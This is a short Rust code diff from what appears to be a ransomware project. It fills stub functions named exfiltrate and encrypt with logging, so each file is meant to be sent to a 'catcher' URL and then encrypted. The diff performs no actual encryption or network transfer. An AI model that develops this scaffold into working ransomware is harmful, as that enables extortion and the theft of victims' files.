@@ -14,20 +14,21 @@ pub fn ransom(root: &str, catcher: &str) {
     }
 }
 
-fn exfiltrate(catcher: &str) -> Result<(FileCount, ByteCount), &'static str> {
-    todo!()
+fn exfiltrate(file: DirEntry, catcher: &str) -> Result<(FileCount, ByteCount), &'static str> {
+    info!("sending {file:?} to URL: {catcher:?}");
+    Ok((0, 0)) // TODO
 }
 
 fn encrypt_files(files: ReadDir, catcher: &str) -> () {
     for file in files {
         if let Ok(entry) = file {
+            info!("encrypting {entry:?}");
             encrypt(entry, catcher);
         }
     }
-    todo!()
 }
 
 fn encrypt(file: DirEntry, catcher: &str) -> Result<(), &'static str> {
-    exfiltrate(catcher)?;
+    exfiltrate(file, catcher)?;
     Ok(())
 }
